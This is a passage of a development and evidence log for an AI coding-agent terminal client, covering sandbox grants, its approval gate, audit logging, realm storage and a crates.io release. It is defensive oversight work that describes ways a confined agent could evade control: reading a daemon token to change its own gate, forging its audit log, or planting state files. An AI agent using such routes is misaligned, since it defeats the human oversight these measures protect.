end, and `tests/daemon.rs` still attaches with the older client's line.

### D3: the endpoint directories are sealed for the file tools

Verified: `read_file` and `grep`/`glob` outside the project were not
sealed but `Err` in `builtin_tier` (`approval/policy.rs`), i.e. a
classifier question, and the endpoint directory was not among the sealed
roots (`bootstrap/scope.rs::seal` names the git dirs, the realm and the
user config dir). An allowed read of `mob.endpoint` handed the agent the
token, with which it could attach from its shell and change its own gate.

`ProjectRoot::with_secret_roots` adds directories that are sealed and
also never read: `ResolvedPath::secret`. The daemon passes
`endpoint::search_dirs()` (`<state>/rkat-tui`, `$XDG_RUNTIME_DIR/rkat-tui`)
and the parent of each endpoint file it may use (`--endpoint-file`
included) before it assembles anything, so the agent's, the helpers' and
the classifier's file tools share the root. The gate returns
`Tier::Sealed` for a `read_file`, or a `grep`/`glob` path, under a secret
root before any allow rule; the tools refuse such a path themselves
(`Shared::resolve`), and their walker skips secret directories, so a
search the classifier allows above them never enters them.

Tests: `the_endpoint_directory_is_sealed_for_reads_and_searches` (policy:
read, grep, glob, write sealed under an allow-all rule; a neighbour still
goes to the classifier) and `the_endpoint_file_is_sealed_for_the_file_tools`
(`tests/approvals.rs`: through the daemon the read is refused
without a classifier question, and an allowed grep above the state
directory ran and does not show the token or the file).

### D4: a client is told when the daemon's agent shell differs from its flags

Verified: the agent's shell is the daemon's, planned once from the
daemon's own command line (`bootstrap::assemble`), and a client attaching
later with other `--confinement` flags used them only for its `!` shell;
`rkat/status` and `rkat/report` named the mode at most, so a user who
started the TUI with `--confinement=strict` beside a daemon started
unconfined was not told.

`rkat/status` now carries `shell`, the engine's `ShellConfinement` the
daemon installed. Before every attach (first and reconnect) the client
probes the status (a probe seats no agent) and compares with the plan its
own flags and layers give (`bootstrap::shell_plan`, which also builds the
`!` shell): equal attaches; inside (`confinement::shell_within`: every
read, write and socket grant inside one of the client's, every exclusion
of the client's kept, the network no wider, a trusted host inside only a
trusted host) attaches with a warning naming both; anything else, a
daemon that does not report its shell, or a client that cannot plan its
own (no sandbox on the host), is `ClientError::ShellWider`, not retried.
A daemon reached on another machine (`--attach=HOST:PORT`, remote) is not
compared: its paths are not this host's. The brief's "warn if the request
is narrower" was read as: warn when the daemon is the narrower one, refuse
when it is wider, the direction that cannot loosen the user's request.

Tests: `a_shell_is_within_another_only_when_it_can_do_no_more`
(confinement: strict inside workspace, not the reverse, unconfined only
inside unconfined, one more write grant is wider) and
`a_client_whose_flags_confine_more_than_the_daemon_is_refused`
(`tests/lifecycle.rs`: an unconfined daemon, a client with
`--confinement=workspace`: refused naming the daemon's shell, not
retried, no agent seated).

### E2: helpers run through their owner's endpoint

Verified: `mobs/customizer.rs::shape` gave a helper its owner's auth
binding only when it ran on the owner's model; on another model the
binding stayed `None`, which the engine resolves as that model's provider
default: the public base URL and the provider's environment key. Behind a
gateway (only its key in the environment) a helper on another model went
around it.

The binding is now chosen in `HelperCustomizer::admit` before the member
is shaped (`helper_binding`): the owner's binding for the owner's model,
for a model the catalog (`WireDialect::of_catalog_model`) does not know
(the endpoint serves or refuses it), and for one whose dialect is the
owner's endpoint's; a model of another dialect is refused (`MobError`, the
agent reads why) naming the configured endpoints of that dialect. A
binding the spawn already names is kept. The daemon hands the customizer
its endpoint registry. A rebuilt helper goes through the same rule.

Test: `a_helper_runs_through_its_owners_endpoint_or_is_refused` (a gateway
owner: same, same-dialect and uncatalogued models get the gateway's
binding; an OpenAI model is refused naming `openai, oai-proxy`; an owner
on a built-in endpoint keeps `None` for its own dialect and is refused
for another). The brief's two-scripted-endpoint integration test was not
built: the rig's daemon runs every session on one `llm_override`, so the
endpoint a helper reaches is not observable there; the binding decision
is pinned at the unit instead.

### S3: the Cargo home is granted entry by entry

Verified: `HostPaths::detect` put `$CARGO_HOME` among the writable
directories, so a confined command could replace `~/.cargo/bin` tools
(run unconfined later by the user), write `config.toml`
(`build.rustc-wrapper`) and read `credentials.toml`.

Engine fact (meerkat-sandbox 0.9.11, Linux): no deny lists and no grant
nested inside another, so "the Cargo home read only with `registry/`
writable and `credentials.toml` hidden" cannot be one grant with
exclusions. It is expressed instead by sibling grants
(`confinement::CargoHome::of`): `registry/` and `git/` writable, every
other entry of the Cargo home its own read-only grant (directories as
subtrees, files as literal files), `credentials.toml` and `credentials`
in no grant. The Cargo home directory itself is then only the mount view's
intermediate directory. Limits, kept explicit: the entries are those found
when the plan is made (an entry created later is not in the view until the
daemon restarts), and cargo's lock files (`.package-cache`,
`.package-cache-mutate`, `.global-cache`) are read only; cargo builds
without them (measured below), `cargo install` fails as intended. A
read-only bind of one path inside a writable grant stays an engine ask
(the same gap as `.rkat/` and `.git/`, below).

Tests: `the_cargo_home_is_granted_entry_by_entry_without_credentials`
(confinement: the grant split, no grant names the credentials, the home
itself is not writable) and
`cargo_builds_under_the_narrowed_cargo_home_grant` (`tests/confinement.rs`,
Linux, this host's real paths: `cargo build --offline` of a crate with a
registry dependency succeeds confined, and `touch` in the Cargo home's
`bin/` and on its `config.toml` fails).

### 1(e): the daemon's own realm files by digest

The engine cannot bind `<workspace>/.rkat/` read only (ask 8 in
`docs/mob-split.md`), so on Linux the agent's confined shell writes the
workspace realm. Of the files rkat-tui itself writes there and reads
back, `tui.toml` and `config.toml` were already trusted only by the host
trust record's digest (outside the workspace; `bootstrap::trust`,
`bootstrap::project_trust`). `tui_helpers.json` was not: it says which
session each helper and agent-made mob works for, and it is read on every
lookup that misses memory and at the next start, so an owner planted
there attributed a restored helper to another session's gate (its rules,
transcript and counters).

`HelperBindings` now records the SHA-256 of the bytes it writes
(`HostTrustRecord::record_digest`: the bytes written, not the file read
again) in the daemon's one shared trust record
(`ProjectInputs::trust_record`, so its saves and the realm files' do not
overwrite each other), and reads the file only when its digest is the one
recorded: otherwise `BindingsError::Changed`, a lookup finds nothing (a
helper bound only by the file is refused, never attributed elsewhere),
`open_or_empty` starts empty, and the next write is memory's. A file the
record holds no digest of (one an older rkat-tui wrote) is refused the
same way, once. `conversations.json`, the cursor, the cost and history
files decide nothing the gate relies on and stay unguarded.

Still exposed until the engine ask lands, and said so in the manual: the
engine's files in the realm, `sessions.sqlite3` above all (its messages of
human authorship seed the classifier's `[user]` lines when a conversation
is resumed), the approval and custody stores. A digest cannot cover a
database the engine writes continuously; the read-only bind is the fix.

Test: `a_bindings_file_changed_underneath_is_not_read` (mobs::bindings: an
owner planted in the file is not read by a live lookup or after a restart,
the next write replaces it, and a file without a recorded digest is
refused).

### E3: the price-list fetch has a config key

Verified: the only request rkat-tui makes to a host that is not a
configured LLM endpoint is the LiteLLM community price list
(`pricing::COMMUNITY_PRICES_URL`, raw.githubusercontent.com, cached for 7 days),
and only `--no-pricing-fetch` turned it off: a user had to pass the flag
on every start.

`[pricing]` is now a `config::PricingTable`: `fetch` beside the
`"<model id>"` override tables (flattened; it reads as the map of
overrides, so a model literally named `fetch` cannot be overridden). The
last user layer that sets `fetch` decides; a project file may set it to
`false` only (not fetching only keeps a request from being made), and its
price overrides stay ignored with the notice as before. The client fetches
when neither the flag nor the layers turn it off. The manual names the
URL.

Tests: `pricing_fetch_is_a_user_setting_the_project_can_only_turn_off`
(config) and the overlay test (`--set pricing.fetch=false` beside a
`pricing."m".input`).

### A6: a turn no user started runs unattended while nobody is attached

Verified before the change: a peer's `send_message` to an idle agent
starts a run (`a_peer_message_wakes_the_other_agent_and_its_client_shows_it`),
and the gate judged its calls exactly like a user's turn: in auto mode the
classifier decided them (the peer's text is not recorded as the user's, so
the classifier saw no consent, but it still allowed what looked harmless),
in manual mode the question waited for a human who may not be there. The
review's "partly inferred" holds: nothing in the gate knew whether a human
was present or had started the turn.

The user's decision (2026-11-10) is now the gate's rule
(`approval::attendance`): a call that needs review (`Route::Review`, and
`Route::Ask`: a protected write, a mode's question) is denied with
`DenyReason::Unattended` before the classifier or the broker, unless the
call is attended. Attended needs positive evidence: a client bound to the
agent that runs as the session now (`Agents::attended`, through
`AgentAttendance`), or the call's run (the dispatch context's
`run_id`; a helper's call takes its owner session's current run) is one
the engine saw start while a client's `mob/member_send`/`mob/turn_start`
to the session waited (`ApprovalEngine::human_input`, consumed by
`run_started`), or that input waits and the run's start is not seen yet
(the event watcher lags the dispatch). A run seen starting without such
input, and a session no live agent runs as, are unattended. The denial
queues a notice per agent (at most 32, then a count) that `rkat/missed`
answers once; the client asks on every attach and shows each as a
warning. The model reads `UNATTENDED_DENIAL` in the tool result.

Known edge, kept: a user's input that is steered into a peer's running
turn marks the next run that starts as the user's.

Tests: `an_unattended_turn_is_denied_what_needs_review` (engine: a peer's
run, nobody attached: `curl` and a protected write denied with no
classifier call and no human asked, the notice queued; read, `ls` and an
in-project write allowed; attaching makes the next call reviewed; the
user's run, before and after its start is seen, is reviewed; the next run
is a peer's again), `a_peer_woken_agent_with_no_client_is_denied_what_needs_review`
(`tests/agents.rs`: through the daemon, B detached and woken by A's
message: no classifier request for its `curl`, B reads why, its
`notes.md` written; a client attaching to B mid-turn is shown the notice
and B's next `curl` is reviewed; `rkat/missed` answers it once) and
`a_turn_the_user_started_is_reviewed_after_its_client_detaches` (the run
id the dispatch carries is the one the watcher saw start after the
user's prompt).

### Recommendation 11: the audit log, outside the workspace

The brief placed the log at `<workspace>/.rkat/tui/audit.jsonl`, "sealed
from the agent's tools like the rest of `.rkat/`", and asked for a test
that the confined shell cannot read it. Verified that this does not hold
there: on Linux the confined shell is granted the whole workspace,
`.rkat/` included (engine ask 8, "S1, S2, E1" above), so a log in the
realm could be read, truncated and forged by the agent it records. The
log is therefore `audit.jsonl` in the directory of the daemon's endpoint
file (`<state>/rkat-tui/<key>/`, or beside `--endpoint-file`), which
already has every property the brief asks for: 0700, the daemon refuses
to start when its shell's plan grants it (`EndpointExposed`), and it is a
secret root of the project root, so the file tools refuse it at tier 0.
The file is opened 0600 with `O_NOFOLLOW` (an existing file is made
0600), appended by the daemon only (`daemon::audit::AuditLog`), and
renamed to `audit.1.jsonl` when a write would take it past 50 MB. A
directory under `$XDG_RUNTIME_DIR` (the endpoint fallback) is cleared at
reboot; the log goes with it there. The endpoint directory no longer
disappears at a stop: the daemon removes its endpoint file and the
directory only when empty, so the audit log keeps it
(`shutdown_stops_the_daemon_and_removes_its_endpoint_file` and
`the_orchestrator_shell_runs_confined` now assert it holds the log and
nothing else; `--list` reads only endpoint files and is unaffected).

What writes it: the engine's `AuditSink` (`approval::audit`), installed
by the daemon (`DaemonAudit`, the agent named from the live agents),
gets one `DecisionRecord` per `decide_as` (the decisive argument is the
action's subjects, else the raw arguments, never cut) and the engine's
own changes of authority (`mode`, `rule_added` also from an escalation's
"allow and add rule", `rule_removed`, `rules_trusted`). The human
decider is the connection that decided: `decision/decide` puts
`human:<connection scope>` on `Settled`, the desk tells the engine
(`ApprovalEngine::answered_by`, the desk holding the engine weakly) and
the escalation's call takes it. `daemon::local` writes
`project_trusted` and `agent_retired`, the daemon `daemon_start` and
`daemon_stop`. A log that cannot be opened is a start-up warning and the
daemon runs without one; a line that cannot be written is logged.
`rkat/audit` answers `/audit` with the last lines naming the caller's
agent or none; `rkat-tui --audit` prints the files beside the endpoint
file's candidate places for the workspace.

Tests: `every_gate_decision_is_one_audit_line_naming_who_decided`
(`tests/approvals.rs`: a policy-allowed read, a classifier allow
and block with its reason, a human's allow named `human:…`, a sealed read
of the log itself refused with nothing of it in the result, exactly five
decision lines, the mode switch, 0600, and `/audit` showing them),
`the_confined_shell_cannot_read_or_write_the_audit_log`
(`tests/confinement.rs`, Linux, this host's real paths: `cat` and an
append from the confined shell fail while the file holds that command's
own decision; `SKIPPED:` without the backend), and the unit tests of
`daemon::audit` (owner-only, one rotated generation, no symbolic link).
`--audit`'s file lookup is not driven by a test: it reads the real state
directory, which the tests must leave alone.

### Recommendation 10: `cargo deny` in CI

`deny.toml` and a `deny` job in `.github/workflows/ci.yml`
(`EmbarkStudios/cargo-deny-action@v2`, `check`); the local gate stays the
five steps (`docs/testing.md`, "Dependency checks"). Run here with
cargo-deny 0.20.2 against the advisory database of 2026-11-10:

- Sources: crates.io only (`unknown-registry`/`unknown-git` deny); the
  tree has no git source, as the pin policy says.
- Licences: the brief's set (MIT, Apache-2.0, BSD-2/3-Clause, ISC,
  Unicode-3.0, Zlib, MPL-2.0) refused three crates of the engine's graph,
  so three more are allowed: MIT-0 (`borrow-or-share`, via `jsonschema`),
  CC0-1.0 (`notify`) and CDLA-Permissive-2.0 (`webpki-roots`, the
  Mozilla root list).
- Advisories (vulnerabilities, `unmaintained = "all"`, yanked denied):
  two hits, neither fixable here. RUSTSEC-2026-0459 (bundled SQLite before
  3.54) through `libsqlite3-sys` 0.35 of the engine's `rusqlite` 0.37:
  `cargo update -p libsqlite3-sys` locks nothing newer (the fix is 0.39, a
  semver-breaking line only the engine can take); fixed upstream in
  lukacf/meerkat#2164, lands with the next Meerkat release.
  RUSTSEC-2026-0462 (rmcp's Streamable HTTP client buffers a response
  body without a limit, fixed in 3.9) through `meerkat-mcp` 0.9.11's
  `rmcp = "1.4"`: `cargo update -p rmcp` locks nothing newer; only an HTTP
  MCP server the user configured can send such a body. Both are in
  `ignore` with a dated reason naming what lifts them, so a new advisory
  still fails the job. Without the two entries `cargo deny check` fails
  with exactly them (verified); with them it passes (`advisories ok, bans
  ok, licenses ok, sources ok`).
- Bans: none (`multiple-versions` and wildcards allowed) to start.

**Updated 2026-11-11 (Meerkat 0.9.12):** RUSTSEC-2026-0459 is gone from the
graph (0.9.12 locks `rusqlite` 0.41.1 and `libsqlite3-sys` 0.39.1, bundled
SQLite 3.54.1), so its ignore is removed. RUSTSEC-2026-0462 stays ignored
with a new reason: 0.9.12 still locks `rmcp` 1.8.0 (`meerkat-mcp`'s
`rmcp = "1.4"`), but `meerkat-mcp` no longer enables rmcp's
`transport-streamable-http-client-reqwest`, so the affected client is not
compiled and `reqwest` 0.13 left this graph (`cargo tree -i reqwest@0.13`
finds nothing; rkat-tui's own `reqwest` is 0.12); cargo-deny matches the
advisory by rmcp's version alone. `unused-ignored-advisory = "deny"` is
set, as upstream does, so the entry fails the job once it is stale.

`cargo-vet` is not added: a deliberate non-goal until asked
(`docs/mob-split.md`, security).

### Recommendation 12: the sandbox claims, pinned

Checked one by one in `tests/confinement.rs` (Linux, the `SKIPPED:`
convention where the backend is unavailable; each ran on this host):

- No network in `strict`: already pinned by
  `strict_mode_denies_the_network_and_workspace_mode_allows_it` (a
  loopback connect is refused in strict and succeeds in workspace mode).
- No `~/.ssh`: `the_confined_shell_does_not_see_the_users_ssh_directory`,
  with this host's real paths (the home holds granted entries: the Cargo
  home's, the cache dir, the rustup home), `test -e ~/.ssh` and a listing
  of `$HOME` both miss it. `SKIPPED:` when the host's home has no `.ssh`:
  then there is nothing whose absence would prove anything.
- `credentials.toml` not readable (S3, SEC-1):
  `the_confined_shell_cannot_read_the_cargo_credentials`, over a Cargo
  home made for the test (a test must not write the user's) holding
  `config.toml`, `credentials.toml` and `credentials`: the config is read
  (the grant works), neither credentials file is in the view.
- No write to `.rkat/` or `.git/`: does not hold. The brief said SEC-1 made
  them read only; SEC-1 recorded the opposite (engine ask 8: the 0.9.11
  Linux backend refuses `deny_write` and a grant nested in the writable
  workspace). `the_realm_and_git_directories_stay_writable_until_engine_ask_8`
  writes `.git/hooks/probe` and `.rkat/tui/probe` from the confined shell
  and asserts both succeed, with a message saying to turn the test into
  the claim once the engine binds them read only. What rkat-tui reads back
  from `.rkat/` stays trusted only by digest (see "1(e)").

### S4, D2, recommendations 9 and 10: the decisions, written down

The user's decisions of 2026-11-10 need no code: S4 (network on by
default) and D2 (no idle timeout) stay as they are, recommendation 9
(a managed policy file) and `cargo-vet` are non-goals until asked.
Verified against the code that the manual states what it does: the
default confinement is `workspace` with the network allowed
(`confinement::lower`, the manual's Confinement table) and `strict` denies
it (pinned by `strict_mode_denies_the_network_and_workspace_mode_allows_it`);
nothing in the daemon stops a detached agent on a timer (`Agents::release`
only marks it detached). The manual's new "Security decisions" section
(under Confinement) states the four decisions (network on and how to turn
it off, no idle timeout, unattended turns, the audit log and where), and
`docs/mob-split.md`'s "Wire and security" lists the non-goals with the
reason for each.

## The realm moves out of the workspace (2026-11-10)

The user's decisions of 2026-11-10 (the maintainer's comment on
zond/rkat-tui#1: the engine cannot make a subtree read only inside a
writable grant, so trusted state must stay outside every shell write
grant): the realm leaves `<workspace>/.rkat/tui/` for
`<config dir>/workspaces/<random id>/`, a manifest there is the only
authority for which workspace owns it, re-homing is explicit, old realms
are not migrated, and a sandbox that could reach the realm refuses the
start.

### Verified first: what a re-home must rewrite

Read from a dogfood realm of this repository (a copy, opened read only)
and the engine's sources:

- Structural state names no workspace path. `realm_manifest.json` holds
  the realm id, backend, origin and creation time; a session's
  `SessionMetadata` holds `realm_id`, model, provider, tooling, comms
  name, never a path; `conversations.json`, `tui_helpers.json` and the
  cursors hold session ids. The realm id is the directory name and does
  not change on a re-home, so every stored session still belongs to its
  realm after one.
- Absolute paths appear only in conversation content: tool results
  (`pwd`'s output), the model's text, a compaction summary
  (`sessions.sqlite3` `session_strand_messages`, and the engine's event
  projection under `<realm>/.rkat/`). After a re-home the agent reads
  its old path in its history; nothing resolves it.
- The engine takes an arbitrary realm root: `open_realm_persistence_in`,
  `start_realm_lease_in` and `inspect_realm_leases_in` all take
  `(realms_root, realm_id)`, and `realm_paths_in` joins them. So
  `realms_root = <config dir>/workspaces`, `realm_id = <id>`.
- What is keyed by the workspace path outside the realm: the endpoint
  file's key (`<state>/rkat-tui/<sha256(path)>/`), which is only live
  while a daemon runs and is looked up again under the new path; and the
  host trust record (`<config>/trust/<sha256(path, realm id)>.toml`),
  which a re-home would lose. The record of a workspace's own realm is
  therefore keyed by the realm id alone
  (`HostTrustRecord::open_for_realm`; its files are workspace-relative).

So a re-home is sound for stored sessions: it rewrites the manifest's
path and nothing else.

### The move

`bootstrap::realm_home`: each realm directory (0700) holds
`workspace.toml` (the canonical workspace path, its name, the `origin`
remote read from `.git/config` with credentials removed, creation and
last use). `resolve_scope` finds the workspace's realm by scanning the
manifests for its canonical path, under an exclusive `flock` on
`workspaces/.lock`, and makes one with a random 16-hex-digit id when
none names it; two manifests naming one path refuse the start naming
both (`HomeError::Duplicate`), and so does a manifest that cannot be
read (it may name this workspace; a directory with no manifest at all
is no realm, the manifest being written before anything else). The
workspace is found from a subdirectory by the manifests too; nothing in
the workspace is read for it.

Fail closed (decision 5): `realm_home::exposing_grant` compares the
shell plan's read and write grants with the realm directory, canonical,
both ways (a grant holding it or inside it); `bootstrap::assemble`
refuses with `TuiError::RealmExposed` before the realm persistence is
opened, and the client's `configure_with` refuses on its `!` shell's
plan. The realm is also a secret root of the project root, so the file
tools neither write nor read it.

No migration (decision c): a `<workspace>/.rkat/tui/` is never read or
imported; a start that finds one says once, in a notice, that it is
unused and can be deleted, and leaves it. A planted one marks nothing.

The audit log follows the realm (addendum): `<realm>/audit.jsonl`, so
the endpoint directory is removed again when the daemon stops, and
`--audit` reads the realm the workspace's manifest names (never making
one).

Also moved to the realm: the conversation log (before, it was
`<workspace>/.rkat/tui/conversations.json` even for an `--isolated`
realm), the attach cursors, the workspace notes (`<realm>/notes`), and
`/export`'s default file. The engine still writes its comms identity
under the user config root (`<root>/.rkat/session_comms_identity`), not
the workspace.

Removed with the move: `bootstrap::committed` (the refusal of a realm
directory git tracks, bfb508b and b2f8944) and `tests/committed_realm.rs`:
no realm is ever in the workspace's `.rkat/tui/` any more, and one found
there is not a realm.

Tests: `realm_home`'s unit tests (a random 0700 realm with a manifest
found again; `two_manifests_naming_one_workspace_refuse_and_name_both`;
`an_unreadable_manifest_refuses_a_start`; orphans offered and set-aside
realms not; `a_grant_holding_or_inside_the_realm_exposes_it`), `scope`'s
(`default_state_lives_in_a_realm_under_the_config_dir`, nothing written
into the workspace, the realm secret to the file tools;
`a_planted_workspace_realm_is_ignored_with_a_notice`; discovery from a
subdirectory by manifest, stopping at the git top-level and below the
home directory), and in `tests/confinement.rs` on this host's real
paths `the_realm_is_out_of_reach_and_git_stays_writable_until_engine_ask_8`
(SEC-2's `the_realm_and_git_directories_stay_writable_until_engine_ask_8`
turned around for the realm: a confined command neither writes nor lists
it; the `.git/` half stays the recorded gap),
`a_shell_that_could_reach_the_realm_refuses_the_start` (`-w` at an
ancestor of the realm, and `--confinement-write` of the config
directory: the daemon and the client both refuse), and
`the_confined_shell_cannot_read_or_write_the_audit_log` on the realm's
log. Rewritten to the new behaviour: `workspace_state_survives_a_rename`
is now `a_moved_workspace_starts_anew_and_is_offered_its_old_state`, and
`the_workspace_realms_confinement_table_is_ignored_with_a_notice` is
`the_workspace_realms_confinement_table_is_a_floor` (the realm config is
the user's now, as a `--state-root` realm's always was). The test rig's
config directory moved beside the workspace (`common::config_dir_for`),
out of it.

### Re-homing, the orphan offer and `--list`

Re-homing is explicit (decision 4): `realm_home::rehome` (the CLI's
`--rehome <ref>`, the TUI's `/rehome <ref>`) takes the realm a reference
names (its id, else the workspace path it served or, once set aside,
served before; a gone path is compared lexically normalized, an existing
one canonical), under the realms lock. It refuses the realm this
workspace already has (`AlreadyHere`), a realm whose workspace still
exists (`StillHomed`: re-homing is for a workspace that moved; a realm
set aside has no path and is adoptable), and either realm a daemon may
hold (`prove_idle`, positive proof only: no live and no unparseable lease
in the realm, `inspect_realm_leases_in`, and every endpoint file of the
workspace it serves or served absent or refusing a connect,
`endpoint::check_stale`; a stale lease is the engine's own proof of a
holder that stopped heartbeating). The realm the workspace had is set
aside first (its manifest's `path` moves to `former_path`), then the
adopted one names the workspace; a failure between the two leaves the
workspace with no realm, never two. Nothing is deleted.

In the TUI, `/rehome` alone lists this workspace's realm and those a
re-home could adopt; `/rehome <ref>` checks the reference
(`check_rehome`), records it and has the UI leave with the daemon
stopped (`Msg::Rehoming` → `Departure::Terminate`), since the realm this
workspace has is the daemon's; once the UI is gone, `client::run` adopts
it (`rehome_after_stop`, retrying a realm proven in use for up to 15 s
while the daemon releases its lease) and says on the terminal what it
did. A start in a workspace with no realm while realms whose workspace
is gone exist makes a new realm and offers those in a notice (the
process that made the realm shows it: the client when it started first,
else the daemon's start-up notices); nothing is adopted silently.

`--list` prints, after the daemons, every realm under the config
directory: id, workspace (`(gone)`, or `set aside, was …`), git remote,
last use, and the daemon of its workspace from the endpoint files already
probed (`daemon pid N`, `no daemon`, a stale file, or unknown).

Tests: `a_rehome_moves_the_path_and_sets_the_new_realm_aside` and
`a_rehome_is_refused_while_a_lease_is_live_or_unreadable` (unit), and in
`tests/client_turns.rs`:
`after_a_rehome_continue_resumes_the_latest_conversation_in_the_new_place`
(the brief's "re-home then `-c`": the same session and its message under
the new path, the realm id unchanged),
`a_rehome_is_refused_while_a_daemon_holds_the_realm` (the live lease of
the moved workspace's new realm refuses it and nothing is rewritten;
`/rehome` lists the old realm, `/rehome <id>` makes the UI leave, and the
adoption then goes through with the new realm set aside, not deleted),
`a_moved_workspace_starts_anew_and_is_offered_its_old_state`, and
`rehome_asks_the_runner_and_leaves_stopping_the_daemon` (UI).

### What the move made unnecessary (item e)

Removed where the move made it provably dead:

- The committed-realm refusal (`bootstrap::committed`, bfb508b and
  b2f8944) went with the move itself: no realm is ever read from the
  workspace's `.rkat/tui/`.
- The helper bindings' digest (4fb1416, reverted): its only reason was
  that the agent's confined shell could write `tui_helpers.json` in the
  workspace realm. Every realm on disk is now outside every grant of a
  confined shell, the start refuses a plan that reaches one
  (`RealmExposed`, which applies to `--state-root` realms too), and an
  unconfined shell is the trusted host. `HostTrustRecord::record_digest`
  and `ProjectInputs::trust_record`, used only by it, went with it, and so
  did its test `a_bindings_file_changed_underneath_is_not_read`.
- The realm `tui.toml`'s digest trust now applies only to a realm inside
  the workspace (`bootstrap::approval::load_layers`), as the realm
  `config.toml`'s project-input guard already did
  (`ProjectInputs::new`: `realm_config` only when it starts with the
  workspace); the workspace's own realm is the user's.

Kept, because it still guards something a clone or the shell can write:
the project inputs (`.rkat/mcp.toml`, `.rkat/config.toml`'s hooks), the
project `.rkat/tui.toml`'s deny-only layering, the sealed `.rkat/` and
`.git/` patterns, and the guard and digest of a realm placed inside the
workspace with an explicit `--state-root` (a clone could carry it; under
confinement such a realm now refuses the start anyway, so this covers
`--no-confinement` only). Engine ask 8 shrinks to `.git/` (S5).

Tests: `tests/realm_trust.rs`'s
`a_rule_appended_under_the_daemon_is_not_adopted_and_is_named` now runs
on a `--state-root` realm inside the workspace (the case still guarded),
and `the_workspace_realms_rules_file_is_the_users` pins that a hand edit
of the workspace's own realm rules applies with no notice.

## Publishing 0.0.1 on crates.io (2026-11-10)

The 0.0.x line is the maintainer's dogfood line, installed with
`cargo install rkat-tui --locked` on other machines; prebuilt binaries
wait for a 0.1.0 meant for other people.

### The SQLite lock profile without the repository's config

`meerkat_sqlite::REQUIRED_LIBSQLITE3_FLAGS` is a performance profile, not
a correctness requirement: without it the bundled SQLite takes three
process-wide locks (allocator statistics, one shared page cache, page-cache
overflow statistics) and every connection in the process queues on them
(`meerkat-sqlite-0.9.11/src/lock_profile.rs`). A registry install reads no
`.cargo/config.toml` of ours, so a plain `cargo install rkat-tui` builds
without the flags. Decision: that build is supported and works; the
README's Install section gives `LIBSQLITE3_FLAGS="…" cargo install
rkat-tui --locked` as the faster form.

Both binaries already called `disable_memory_statistics_at_process_start()`
as the first statement of `main`, which removes the one lock with a runtime
switch; the other two need the flags.

Probe, and a trap in it: `cd /tmp && cargo install --path <checkout>`
still applied the checkout's `.cargo/config.toml` `[env]` (the SQLite
archive it built lists `DEFAULT_MEMSTATUS=0` and
`DISABLE_PAGECACHE_OVERFLOW_STATS` among its compile options), so it is not
a registry install, and its daemon logged nothing about locks. Installing
from a copy of the packaged crate (`target/package/rkat-tui-0.0.1`, which
has no `.cargo/`) under `/tmp` is: 19 minutes on a loaded machine, an
archive with `ENABLE_MEMORY_MANAGEMENT`, `--version` printing `0.0.1`, and
a daemon started in the foreground against a scratch home with a fake key
that served and shut down cleanly on SIGTERM, logging the engine's one
warning (`meerkat_sqlite::lock_profile`, at the first connection, after
the daemon's log is up): "SQLite runs with process-wide locks (memory
statistics off, shared page cache on, page-cache overflow statistics on);
build with LIBSQLITE3_FLAGS=…; concurrent connections in this process
queue on these locks (allocator statistics switch at process start:
applied)". It names the setting itself, so the application adds nothing
(a notice of the daemon's own, 39a235b, was reverted as a duplicate once
the right probe showed the engine's line). The TUI logs only to its file,
so the line never reaches the screen. A small probe binary on
`meerkat-sqlite` alone, built the same way, reports the same profile through
`check_lock_profile()`.

### The package

`cargo publish --dry-run` packaged the crate as it was: the self
dev-dependency (`rkat-tui = { path = ".", features = ["test-support"] }`)
has no version, and cargo drops such a dev-dependency from the published
manifest, so the packaged crate's tests do not build from the registry
(they need the feature), which nothing asks of them. `exclude` leaves out
the development-only files a registry build never reads (`.github/`,
`.cargo/`, `rust-toolchain.toml`, `CLAUDE.md`, `deny.toml`); the docs,
`docs/evidence.md` included, ship, at about 1.1 MiB compressed. The
licence files were symbolic links into the monorepo the crate came from
(`../../LICENSE-*`), dangling here; they are real files now.

### The build id

`rkat_tui::BUILD` is `build.rs`'s `RKAT_TUI_BUILD`: the version plus the
commit when the crate is built from its own checkout, the version alone
otherwise. A registry build unpacks into `~/.cargo/registry/src/`, which
may sit inside another repository (a home directory kept in git), so the
commit is taken only when `git rev-parse --show-toplevel` is the manifest
directory and the sources carry no `.cargo_vcs_info.json`. `--version` of
both binaries prints it (`cli::tests::version_is_the_build_id`), and so
does `/status`. Probe: the build script compiled alone and run with the
manifest directory pointed at the checkout printed `0.0.1+<commit>`, at
`target/package/rkat-tui-0.0.1` (a packaged crate inside this very work
tree) and at a directory outside any repository `0.0.1`.

## Re-home reworked (2026-11-10, the user's decisions)

One realm and one daemon per workspace stays the model, and two
manifests naming one path stay an error (`HomeError::Duplicate`). What
changed is the re-home.

### What a re-home is now

`client::rehome`: `prepare` checks, `carry_out` stops daemons and
commits (`realm_home::commit`). Every refusal comes before anything
changes:

- the new root must not reach the realm (`realm_home::check_reach`: the
  workspace holds the realm directory or lies inside it); the daemon's
  start checks the whole confinement plan again (`exposing_grant`);
- a turn running on a daemon the re-home would stop (`rkat/status`'s
  agent rows; unknown is not idle): `RehomeError::Running` names the
  daemon and the agent;
- the destination's realm, when the workspace has one, must be provably
  empty: no daemon with a client other than the one re-homing
  (`RehomeError::Busy`), no conversation of its log with a user message,
  and what cannot be read is not empty (`HomeError::Holds`). With a
  daemon running on it the daemon answers (`rkat/holds`, new:
  `Conversations::holding` reads each logged conversation's history a
  page at a time until a `Message::User`); without one the realm's files
  do (`realm_home::holds`: the conversation log read strictly, a missing
  log is empty, then each session from the session store). `commit`
  checks it again under the realms lock, once both realms are proven
  idle;
- an argument that reads both ways (`HomeError::TwoReadings`);
  `realm_home::read_reference`: a realm's id or a path some manifest
  names is a pull, any other existing directory a push, both is refused
  naming both readings, and `/rehome from <ref>` / `/rehome to <dir>` say
  which; a realm whose leases cannot be read (`prove_idle`, fail closed);
  duplicate manifests.

Removed: `HomeError::StillHomed` (a re-home no longer looks at whether
either workspace directory exists; a directory started again after its
realm moved gets a fresh realm), and the set-aside machinery
(`Manifest::former_path`, a manifest with no `path`, "recoverable by
`--rehome <its id>`"): the replaced realm is empty by construction, so it
is removed: its manifest first (a directory without one is no realm),
then the adopted realm's manifest names the workspace, then the rest of
the directory. A crash in between leaves the workspace with no realm or
the adopted one, never two. The manifest is read strictly now
(`deny_unknown_fields`, `path` required); a manifest of the set-aside
shape is `Unreadable` and refuses starts until removed.

A daemon running on the realm that moves is no reason to refuse: it is
asked to stop with `rkat/shutdown {retire: false}`, so its agents are
restored at the next start, and its other clients are disconnected;
their reconnect looks for the old directory's daemon, which no longer
exists, so it never reaches the moved realm.

### A restart, not a hot swap

